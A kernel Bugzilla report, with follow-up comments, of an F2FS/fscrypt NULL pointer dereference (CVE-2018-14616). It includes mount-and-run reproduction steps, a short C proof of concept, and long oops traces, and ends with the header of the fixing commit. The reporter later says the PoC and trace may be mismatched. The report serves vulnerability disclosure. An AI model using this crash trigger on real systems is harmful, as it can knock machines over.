| [Description](show_bug.cgi?id=200465#c0)  Wen Xu    2018-07-09 23:38:24 UTC  ``` Created [attachment 277309](attachment.cgi?id=277309 "The (compressed) crafted image which causes crash") [[details]](attachment.cgi?id=277309&action=edit "The (compressed) crafted image which causes crash") The (compressed) crafted image which causes crash  - Reproduce # mkdir mnt # mount -t f2fs -i final.img mnt # gcc -o poc poc.c # ./poc ./mnt  - POC (poc.c)     #define _GNU_SOURCE     #include <sys/types.h>     #include <sys/mount.h>     #include <sys/mman.h>     #include <sys/stat.h>     #include <sys/xattr.h>      #include <dirent.h>     #include <errno.h>     #include <error.h>     #include <fcntl.h>     #include <stdio.h>     #include <stdlib.h>     #include <string.h>     #include <unistd.h>      #include <linux/falloc.h>     #include <linux/loop.h>      static void activity(char *mpoint) {        char *xattr;       int err;        err = asprintf(&xattr, "%s/foo/bar/xattr", mpoint);        char buf2[113];       memset(buf2, 0, sizeof(buf2));       listxattr(xattr, buf2, sizeof(buf2));      }      int main(int argc, char *argv[]) {       activity(argv[1]);       return 0;     }  - kernel message [  844.718738] F2FS-fs (loop0): Mounted with checkpoint version = 2 [  846.430929] F2FS-fs (loop0): access invalid blkaddr:1024 [  846.431058] WARNING: CPU: 1 PID: 1249 at fs/f2fs/checkpoint.c:154 f2fs_is_valid_blkaddr+0x10f/0x160 [  846.431059] Modules linked in: snd_hda_codec_generic snd_hda_intel snd_hda_codec snd_hda_core snd_hwdep snd_pcm snd_timer snd input_leds joydev soundcore serio_raw i2c_piix4 mac_hid ib_iser rdma_cm iw_cm ib_cm ib_core configfs iscsi_tcp libiscsi_tcp libiscsi scsi_transport_iscsi autofs4 raid10 raid456 libcrc32c async_raid6_recov async_memcpy async_pq async_xor xor async_tx raid6_pq raid1 raid0 multipath linear qxl ttm crct10dif_pclmul crc32_pclmul drm_kms_helper ghash_clmulni_intel syscopyarea sysfillrect sysimgblt fb_sys_fops pcbc drm 8139too aesni_intel 8139cp floppy psmouse mii aes_x86_64 crypto_simd pata_acpi cryptd glue_helper [  846.431310] CPU: 1 PID: 1249 Comm: a.out Not tainted 4.18.0-rc3+ #1 [  846.431312] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014 [  846.431315] RIP: 0010:f2fs_is_valid_blkaddr+0x10f/0x160 [  846.431316] Code: 00 eb ed 31 c0 83 fa 05 75 ae 48 83 ec 08 48 8b 3f 89 f1 48 c7 c2 fc 0b 0f 8b 48 c7 c6 8b d7 09 8b 88 44 24 07 e8 61 8b ff ff <0f> 0b 0f b6 44 24 07 48 83 c4 08 eb 81 4c 8b 47 10 8b 8f 38 04 00 [  846.431347] RSP: 0018:ffff961c414a7bc0 EFLAGS: 00010282 [  846.431349] RAX: 0000000000000000 RBX: ffffc5f787b8ea80 RCX: 0000000000000000 [  846.431350] RDX: 0000000000000000 RSI: ffff89dfffd165d8 RDI: ffff89dfffd165d8 [  846.431351] RBP: ffff961c414a7c20 R08: 0000000000000001 R09: 0000000000000248 [  846.431353] R10: 0000000000000000 R11: 0000000000000248 R12: 0000000000000007 [  846.431369] R13: ffff89dff5492800 R14: ffff89dfae3aa000 R15: ffff89dff4ff88d0 [  846.431372] FS:  00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000 [  846.431373] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [  846.431374] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0 [  846.431384] Call Trace: [  846.431426]  f2fs_iget+0x6f4/0xe70 [  846.431430]  ? f2fs_find_entry+0x71/0x90 [  846.431432]  f2fs_lookup+0x1aa/0x390 [  846.431452]  __lookup_slow+0x97/0x150 [  846.431459]  lookup_slow+0x35/0x50 [  846.431462]  walk_component+0x1c6/0x470 [  846.431479]  ? memcg_kmem_charge_memcg+0x70/0x90 [  846.431488]  ? page_add_file_rmap+0x13/0x200 [  846.431491]  path_lookupat+0x76/0x230 [  846.431501]  ? __alloc_pages_nodemask+0xfc/0x280 [  846.431504]  filename_lookup+0xb8/0x1a0 [  846.431534]  ? _cond_resched+0x16/0x40 [  846.431541]  ? kmem_cache_alloc+0x160/0x1d0 [  846.431549]  ? path_listxattr+0x41/0xa0 [  846.431551]  path_listxattr+0x41/0xa0 [  846.431570]  do_syscall_64+0x55/0x100 [  846.431583]  entry_SYSCALL_64_after_hwframe+0x44/0xa9 [  846.431607] RIP: 0033:0x7f882de1c0d7 [  846.431607] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48 [  846.431639] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG_RAX: 00000000000000c2 [  846.431641] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7 [  846.431642] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0 [  846.431643] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000 [  846.431645] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550 [  846.431646] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000 [  846.431648] ---[ end trace abca54df39d14f5c ]--- [  846.431651] F2FS-fs (loop0): invalid blkaddr: 1024, type: 5, run fsck to fix. [  846.431762] WARNING: CPU: 1 PID: 1249 at fs/f2fs/f2fs.h:2697 f2fs_iget+0xd17/0xe70 [  846.431763] Modules linked in: snd_hda_codec_generic snd_hda_intel snd_hda_codec snd_hda_core snd_hwdep snd_pcm snd_timer snd input_leds joydev soundcore serio_raw i2c_piix4 mac_hid ib_iser rdma_cm iw_cm ib_cm ib_core configfs iscsi_tcp libiscsi_tcp libiscsi scsi_transport_iscsi autofs4 raid10 raid456 libcrc32c async_raid6_recov async_memcpy async_pq async_xor xor async_tx raid6_pq raid1 raid0 multipath linear qxl ttm crct10dif_pclmul crc32_pclmul drm_kms_helper ghash_clmulni_intel syscopyarea sysfillrect sysimgblt fb_sys_fops pcbc drm 8139too aesni_intel 8139cp floppy psmouse mii aes_x86_64 crypto_simd pata_acpi cryptd glue_helper [  846.431797] CPU: 1 PID: 1249 Comm: a.out Tainted: G        W         4.18.0-rc3+ #1 [  846.431798] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014 [  846.431800] RIP: 0010:f2fs_iget+0xd17/0xe70 [  846.431801] Code: ff ff 48 63 d8 e9 e1 f6 ff ff 48 8b 45 c8 41 b8 05 00 00 00 48 c7 c2 d8 e8 0e 8b 48 c7 c6 1d b0 0a 8b 48 8b 38 e8 f9 b4 00 00 <0f> 0b 48 8b 45 c8 f0 80 48 48 04 e9 d8 f9 ff ff 0f 0b 48 8b 43 18 [  846.431832] RSP: 0018:ffff961c414a7bd0 EFLAGS: 00010282 [  846.431834] RAX: 0000000000000000 RBX: ffffc5f787b8ea80 RCX: 0000000000000006 [  846.431835] RDX: 0000000000000000 RSI: 0000000000000096 RDI: ffff89dfffd165d0 [  846.431836] RBP: ffff961c414a7c20 R08: 0000000000000000 R09: 0000000000000273 [  846.431837] R10: 0000000000000000 R11: ffff89dfad50ca60 R12: 0000000000000007 [  846.431838] R13: ffff89dff5492800 R14: ffff89dfae3aa000 R15: ffff89dff4ff88d0 [  846.431840] FS:  00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000 [  846.431841] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [  846.431842] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0 [  846.431846] Call Trace: [  846.431850]  ? f2fs_find_entry+0x71/0x90 [  846.431853]  f2fs_lookup+0x1aa/0x390 [  846.431856]  __lookup_slow+0x97/0x150 [  846.431858]  lookup_slow+0x35/0x50 [  846.431874]  walk_component+0x1c6/0x470 [  846.431878]  ? memcg_kmem_charge_memcg+0x70/0x90 [  846.431880]  ? page_add_file_rmap+0x13/0x200 [  846.431882]  path_lookupat+0x76/0x230 [  846.431884]  ? __alloc_pages_nodemask+0xfc/0x280 [  846.431886]  filename_lookup+0xb8/0x1a0 [  846.431890]  ? _cond_resched+0x16/0x40 [  846.431891]  ? kmem_cache_alloc+0x160/0x1d0 [  846.431894]  ? path_listxattr+0x41/0xa0 [  846.431896]  path_listxattr+0x41/0xa0 [  846.431898]  do_syscall_64+0x55/0x100 [  846.431901]  entry_SYSCALL_64_after_hwframe+0x44/0xa9 [  846.431902] RIP: 0033:0x7f882de1c0d7 [  846.431903] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48 [  846.431934] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG_RAX: 00000000000000c2 [  846.431936] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7 [  846.431937] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0 [  846.431939] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000 [  846.431940] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550 [  846.431941] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000 [  846.431943] ---[ end trace abca54df39d14f5d ]--- [  846.432033] F2FS-fs (loop0): access invalid blkaddr:1024 [  846.432051] WARNING: CPU: 1 PID: 1249 at fs/f2fs/checkpoint.c:154 f2fs_is_valid_blkaddr+0x10f/0x160 [  846.432051] Modules linked in: snd_hda_codec_generic snd_hda_intel snd_hda_codec snd_hda_core snd_hwdep snd_pcm snd_timer snd input_leds joydev soundcore serio_raw i2c_piix4 mac_hid ib_iser rdma_cm iw_cm ib_cm ib_core configfs iscsi_tcp libiscsi_tcp libiscsi scsi_transport_iscsi autofs4 raid10 raid456 libcrc32c async_raid6_recov async_memcpy async_pq async_xor xor async_tx raid6_pq raid1 raid0 multipath linear qxl ttm crct10dif_pclmul crc32_pclmul drm_kms_helper ghash_clmulni_intel syscopyarea sysfillrect sysimgblt fb_sys_fops pcbc drm 8139too aesni_intel 8139cp floppy psmouse mii aes_x86_64 crypto_simd pata_acpi cryptd glue_helper [  846.432085] CPU: 1 PID: 1249 Comm: a.out Tainted: G        W         4.18.0-rc3+ #1 [  846.432086] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014 [  846.432089] RIP: 0010:f2fs_is_valid_blkaddr+0x10f/0x160 [  846.432089] Code: 00 eb ed 31 c0 83 fa 05 75 ae 48 83 ec 08 48 8b 3f 89 f1 48 c7 c2 fc 0b 0f 8b 48 c7 c6 8b d7 09 8b 88 44 24 07 e8 61 8b ff ff <0f> 0b 0f b6 44 24 07 48 83 c4 08 eb 81 4c 8b 47 10 8b 8f 38 04 00 [  846.432120] RSP: 0018:ffff961c414a7900 EFLAGS: 00010286 [  846.432122] RAX: 0000000000000000 RBX: 0000000000000400 RCX: 0000000000000006 [  846.432123] RDX: 0000000000000000 RSI: 0000000000000096 RDI: ffff89dfffd165d0 [  846.432124] RBP: ffff89dff5492800 R08: 0000000000000001 R09: 000000000000029d [  846.432125] R10: ffff961c414a7820 R11: 000000000000029d R12: 0000000000000400 [  846.432126] R13: 0000000000000000 R14: ffff89dff4ff88d0 R15: 0000000000000000 [  846.432128] FS:  00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000 [  846.432130] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [  846.432131] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0 [  846.432135] Call Trace: [  846.432151]  f2fs_wait_on_block_writeback+0x20/0x110 [  846.432158]  f2fs_grab_read_bio+0xbc/0xe0 [  846.432161]  f2fs_submit_page_read+0x21/0x280 [  846.432163]  f2fs_get_read_data_page+0xb7/0x3c0 [  846.432165]  f2fs_get_lock_data_page+0x29/0x1e0 [  846.432167]  f2fs_get_new_data_page+0x148/0x550 [  846.432170]  f2fs_add_regular_entry+0x1d2/0x550 [  846.432178]  ? __switch_to+0x12f/0x460 [  846.432181]  f2fs_add_dentry+0x6a/0xd0 [  846.432184]  f2fs_do_add_link+0xe9/0x140 [  846.432186]  __recover_dot_dentries+0x260/0x280 [  846.432189]  f2fs_lookup+0x343/0x390 [  846.432193]  __lookup_slow+0x97/0x150 [  846.432195]  lookup_slow+0x35/0x50 [  846.432208]  walk_component+0x1c6/0x470 [  846.432212]  ? memcg_kmem_charge_memcg+0x70/0x90 [  846.432215]  ? page_add_file_rmap+0x13/0x200 [  846.432217]  path_lookupat+0x76/0x230 [  846.432219]  ? __alloc_pages_nodemask+0xfc/0x280 [  846.432221]  filename_lookup+0xb8/0x1a0 [  846.432224]  ? _cond_resched+0x16/0x40 [  846.432226]  ? kmem_cache_alloc+0x160/0x1d0 [  846.432228]  ? path_listxattr+0x41/0xa0 [  846.432230]  path_listxattr+0x41/0xa0 [  846.432233]  do_syscall_64+0x55/0x100 [  846.432235]  entry_SYSCALL_64_after_hwframe+0x44/0xa9 [  846.432237] RIP: 0033:0x7f882de1c0d7 [  846.432237] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48 [  846.432269] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG_RAX: 00000000000000c2 [  846.432271] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7 [  846.432272] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0 [  846.432273] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000 [  846.432274] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550 [  846.432275] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000 [  846.432277] ---[ end trace abca54df39d14f5e ]--- [  846.432279] F2FS-fs (loop0): invalid blkaddr: 1024, type: 5, run fsck to fix. [  846.432376] WARNING: CPU: 1 PID: 1249 at fs/f2fs/f2fs.h:2697 f2fs_wait_on_block_writeback+0xb1/0x110 [  846.432376] Modules linked in: snd_hda_codec_generic snd_hda_intel snd_hda_codec snd_hda_core snd_hwdep snd_pcm snd_timer snd input_leds joydev soundcore serio_raw i2c_piix4 mac_hid ib_iser rdma_cm iw_cm ib_cm ib_core configfs iscsi_tcp libiscsi_tcp libiscsi scsi_transport_iscsi autofs4 raid10 raid456 libcrc32c async_raid6_recov async_memcpy async_pq async_xor xor async_tx raid6_pq raid1 raid0 multipath linear qxl ttm crct10dif_pclmul crc32_pclmul drm_kms_helper ghash_clmulni_intel syscopyarea sysfillrect sysimgblt fb_sys_fops pcbc drm 8139too aesni_intel 8139cp floppy psmouse mii aes_x86_64 crypto_simd pata_acpi cryptd glue_helper [  846.432410] CPU: 1 PID: 1249 Comm: a.out Tainted: G        W         4.18.0-rc3+ #1 [  846.432411] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014 [  846.432413] RIP: 0010:f2fs_wait_on_block_writeback+0xb1/0x110 [  846.432414] Code: 66 90 f0 ff 4b 34 74 59 5b 5d c3 48 8b 7d 00 41 b8 05 00 00 00 89 d9 48 c7 c2 d8 e8 0e 8b 48 c7 c6 1d b0 0a 8b e8 df bc fd ff <0f> 0b f0 80 4d 48 04 e9 67 ff ff ff 48 8b 03 48 c1 e8 37 83 e0 07 [  846.432445] RSP: 0018:ffff961c414a7910 EFLAGS: 00010286 [  846.432447] RAX: 0000000000000000 RBX: 0000000000000400 RCX: 0000000000000006 [  846.432448] RDX: 0000000000000000 RSI: 0000000000000092 RDI: ffff89dfffd165d0 [  846.432449] RBP: ffff89dff5492800 R08: 0000000000000000 R09: 00000000000002d1 [  846.432450] R10: ffff961c414a7820 R11: ffff89dfad50cf80 R12: 0000000000000400 [  846.432451] R13: 0000000000000000 R14: ffff89dff4ff88d0 R15: 0000000000000000 [  846.432453] FS:  00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000 [  846.432454] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [  846.432455] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0 [  846.432459] Call Trace: [  846.432463]  f2fs_grab_read_bio+0xbc/0xe0 [  846.432464]  f2fs_submit_page_read+0x21/0x280 [  846.432466]  f2fs_get_read_data_page+0xb7/0x3c0 [  846.432468]  f2fs_get_lock_data_page+0x29/0x1e0 [  846.432470]  f2fs_get_new_data_page+0x148/0x550 [  846.432473]  f2fs_add_regular_entry+0x1d2/0x550 [  846.432475]  ? __switch_to+0x12f/0x460 [  846.432477]  f2fs_add_dentry+0x6a/0xd0 [  846.432480]  f2fs_do_add_link+0xe9/0x140 [  846.432483]  __recover_dot_dentries+0x260/0x280 [  846.432485]  f2fs_lookup+0x343/0x390 [  846.432488]  __lookup_slow+0x97/0x150 [  846.432490]  lookup_slow+0x35/0x50 [  846.432505]  walk_component+0x1c6/0x470 [  846.432509]  ? memcg_kmem_charge_memcg+0x70/0x90 [  846.432511]  ? page_add_file_rmap+0x13/0x200 [  846.432513]  path_lookupat+0x76/0x230 [  846.432515]  ? __alloc_pages_nodemask+0xfc/0x280 [  846.432517]  filename_lookup+0xb8/0x1a0 [  846.432520]  ? _cond_resched+0x16/0x40 [  846.432522]  ? kmem_cache_alloc+0x160/0x1d0 [  846.432525]  ? path_listxattr+0x41/0xa0 [  846.432526]  path_listxattr+0x41/0xa0 [  846.432529]  do_syscall_64+0x55/0x100 [  846.432531]  entry_SYSCALL_64_after_hwframe+0x44/0xa9 [  846.432533] RIP: 0033:0x7f882de1c0d7 [  846.432533] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48 [  846.432565] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG_RAX: 00000000000000c2 [  846.432567] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7 [  846.432568] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0 [  846.432569] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000 [  846.432570] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550 [  846.432571] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000 [  846.432573] ---[ end trace abca54df39d14f5f ]--- [  846.434280] BUG: unable to handle kernel NULL pointer dereference at 0000000000000008 [  846.434424] PGD 80000001ebd3a067 P4D 80000001ebd3a067 PUD 1eb1ae067 PMD 0 [  846.434551] Oops: 0000 [#1] SMP PTI [  846.434697] CPU: 0 PID: 44 Comm: kworker/u5:0 Tainted: G        W         4.18.0-rc3+ #1 [  846.434805] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014 [  846.435000] Workqueue: fscrypt_read_queue decrypt_work [  846.435174] RIP: 0010:fscrypt_do_page_crypto+0x6e/0x2d0 [  846.435351] Code: 00 65 48 8b 04 25 28 00 00 00 48 89 84 24 88 00 00 00 31 c0 e8 43 c2 e0 ff 49 8b 86 48 02 00 00 85 ed c7 44 24 70 00 00 00 00 <48> 8b 58 08 0f 84 14 02 00 00 48 8b 78 10 48 8b 0c 24 48 c7 84 24 [  846.435696] RSP: 0018:ffff961c40f9bd60 EFLAGS: 00010206 [  846.435870] RAX: 0000000000000000 RBX: ffffc5f787719b80 RCX: ffffc5f787719b80 [  846.436051] RDX: ffffffff8b9f4b88 RSI: ffffffff8b0ae622 RDI: ffff961c40f9bdb8 [  846.436261] RBP: 0000000000001000 R08: ffffc5f787719b80 R09: 0000000000001000 [  846.436433] R10: 0000000000000018 R11: fefefefefefefeff R12: ffffc5f787719b80 [  846.436562] R13: ffffc5f787719b80 R14: ffff89dff4ff88d0 R15: 0ffff89dfaddee60 [  846.436658] FS:  0000000000000000(0000) GS:ffff89dfffc00000(0000) knlGS:0000000000000000 [  846.436758] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [  846.436898] CR2: 0000000000000008 CR3: 00000001eddd0000 CR4: 00000000000006f0 [  846.437001] Call Trace: [  846.437181]  ? check_preempt_wakeup+0xf2/0x230 [  846.437276]  ? check_preempt_curr+0x7c/0x90 [  846.437370]  fscrypt_decrypt_page+0x48/0x4d [  846.437466]  __fscrypt_decrypt_bio+0x5b/0x90 [  846.437542]  decrypt_work+0x12/0x20 [  846.437651]  process_one_work+0x15e/0x3d0 [  846.437740]  worker_thread+0x4c/0x440 [  846.437848]  kthread+0xf8/0x130 [  846.437938]  ? rescuer_thread+0x350/0x350 [  846.438022]  ? kthread_associate_blkcg+0x90/0x90 [  846.438117]  ret_from_fork+0x35/0x40 [  846.438201] Modules linked in: snd_hda_codec_generic snd_hda_intel snd_hda_codec snd_hda_core snd_hwdep snd_pcm snd_timer snd input_leds joydev soundcore serio_raw i2c_piix4 mac_hid ib_iser rdma_cm iw_cm ib_cm ib_core configfs iscsi_tcp libiscsi_tcp libiscsi scsi_transport_iscsi autofs4 raid10 raid456 libcrc32c async_raid6_recov async_memcpy async_pq async_xor xor async_tx raid6_pq raid1 raid0 multipath linear qxl ttm crct10dif_pclmul crc32_pclmul drm_kms_helper ghash_clmulni_intel syscopyarea sysfillrect sysimgblt fb_sys_fops pcbc drm 8139too aesni_intel 8139cp floppy psmouse mii aes_x86_64 crypto_simd pata_acpi cryptd glue_helper [  846.438653] CR2: 0000000000000008 [  846.438713] ---[ end trace abca54df39d14f60 ]--- [  846.438796] RIP: 0010:fscrypt_do_page_crypto+0x6e/0x2d0 [  846.438844] Code: 00 65 48 8b 04 25 28 00 00 00 48 89 84 24 88 00 00 00 31 c0 e8 43 c2 e0 ff 49 8b 86 48 02 00 00 85 ed c7 44 24 70 00 00 00 00 <48> 8b 58 08 0f 84 14 02 00 00 48 8b 78 10 48 8b 0c 24 48 c7 84 24 [  846.439084] RSP: 0018:ffff961c40f9bd60 EFLAGS: 00010206 [  846.439176] RAX: 0000000000000000 RBX: ffffc5f787719b80 RCX: ffffc5f787719b80 [  846.440927] RDX: ffffffff8b9f4b88 RSI: ffffffff8b0ae622 RDI: ffff961c40f9bdb8 [  846.442083] RBP: 0000000000001000 R08: ffffc5f787719b80 R09: 0000000000001000 [  846.443284] R10: 0000000000000018 R11: fefefefefefefeff R12: ffffc5f787719b80 [  846.444448] R13: ffffc5f787719b80 R14: ffff89dff4ff88d0 R15: 0ffff89dfaddee60 [  846.445558] FS:  0000000000000000(0000) GS:ffff89dfffc00000(0000) knlGS:0000000000000000 [  846.446687] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 [  846.447796] CR2: 0000000000000008 CR3: 00000001eddd0000 CR4: 00000000000006f0  - Location <https://elixir.bootlin.com/linux/v4.18-rc4/source/fs/crypto/crypto.c#L149> 	struct crypto_skcipher *tfm = ci->ci_ctfm; Here ci can be NULL  Note that this issue maybe require CONFIG_F2FS_FS_ENCRYPTION=y to reproduce.  Reported by Wen Xu (wen.xu@gatech.edu) from SSLab at Gatech. ```  [Comment 1](show_bug.cgi?id=200465#c1)  Chao Yu    2018-08-26 00:56:29 UTC  ``` Wen Xu,  I didn't see encryption feature is on in uploaded image, but actually, our stack is stuck in decrypting flow, could you check the image again?  Info: superblock features = 0 : ```  [Comment 2](show_bug.cgi?id=200465#c2)  Steve Beattie    2018-09-13 18:48:15 UTC  ``` This was assigned CVE-2018-14616 (see <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14616>).  Chao, is it correct that the fix for this issue landed as <https://git.kernel.org/linus/91291e9998d208370eb8156c760691b873bd7522> ? Or are additional fixes needed?  Thanks! ```  [Comment 3](show_bug.cgi?id=200465#c3)  Chao Yu    2018-09-17 03:04:10 UTC  ``` Steve,  I figure out that patch to solve issue which I encounter with image attached by Wen Xu, the bug can be triggered with below scripts: - mount image /mnt/f2fs/ - cd /mnt/f2fs/foo/bar/ - ls -l  After applying that patch, the problem was gone.  But when the bug triggeres, related call stack is not the same as reported one, also I can't reproduce reported call stack with the method provided from Wen Xu.  I guess the right producing way is adding master key for encrypted file, I'd like to confirm with Wen Xu. ```  [Comment 4](show_bug.cgi?id=200465#c4)  Wen Xu    2018-09-20 21:11:13 UTC  ``` (In reply to Chao Yu from [comment #3](show_bug.cgi?id=200465#c3)) > Steve, >  > I figure out that patch to solve issue which I encounter with image attached > by Wen Xu, the bug can be triggered with below scripts: > - mount image /mnt/f2fs/ > - cd /mnt/f2fs/foo/bar/ > - ls -l >  > After applying that patch, the problem was gone. >  > But when the bug triggeres, related call stack is not the same as reported > one, also I can't reproduce reported call stack with the method provided > from Wen Xu. >  > I guess the right producing way is adding master key for encrypted file, I'd > like to confirm with Wen Xu.  Hi Chao,  Sorry for a late reply! Eh the first thing is that I never did anything like adding master key for encrypted file. Second, I feel I pasted wrong (mismatched) kernel message/PoC...but unfortunately I do not have a local copy on my laptop now. ```  [Comment 5](show_bug.cgi?id=200465#c5)  Chao Yu    2018-09-21 01:41:40 UTC  ``` (In reply to Wen Xu from [comment #4](show_bug.cgi?id=200465#c4)) > (In reply to Chao Yu from [comment #3](show_bug.cgi?id=200465#c3)) > > Steve, > >  > > I figure out that patch to solve issue which I encounter with image > attached > > by Wen Xu, the bug can be triggered with below scripts: > > - mount image /mnt/f2fs/ > > - cd /mnt/f2fs/foo/bar/ > > - ls -l > >  > > After applying that patch, the problem was gone. > >  > > But when the bug triggeres, related call stack is not the same as reported > > one, also I can't reproduce reported call stack with the method provided > > from Wen Xu. > >  > > I guess the right producing way is adding master key for encrypted file, > I'd > > like to confirm with Wen Xu. >  > Hi Chao, >  > Sorry for a late reply! Eh the first thing is that I never did anything like > adding master key for encrypted file. Second, I feel I pasted wrong > (mismatched) kernel message/PoC...but unfortunately I do not have a local > copy on my laptop now.  Hi Wen,  Oops, if you got another similar kernel message, please let me know.  BTW, let me tag status of this issue as NEEDINFO ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=200465&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=200465)
* - [XML](show_bug.cgi?ctype=xml&id=200465)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=200465)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/latest/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=200465&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](createaccount.cgi?request_new_password=1)
    Login:

    [x]



=== Content from git.kernel.org_01d2f306_20250126_120704.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=91291e9998d208370eb8156c760691b873bd752)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=91291e9998d208370eb8156c760691b873bd752)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=91291e9998d208370eb8156c760691b873bd752)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=91291e9998d208370eb8156c760691b873bd752)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Chao Yu <yuchao0@huawei.com> | 2018-07-10 23:01:45 +0800 |
| --- | --- | --- |
| committer | Jaegeuk Kim <jaegeuk@kernel.org> | 2018-08-13 10:48:17 -0700 |
| commit | [91291e9998d208370eb8156c760691b873bd7522](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=91291e9998d208370eb8156c760691b873bd7522) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=91291e9998d208370eb8156c760691b873bd7522)) | |
| tree | [5dc722ae7d9ca1e5d8305209bd1d04e39161f37a](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=91291e9998d208370eb8156c760691b873bd752) | |
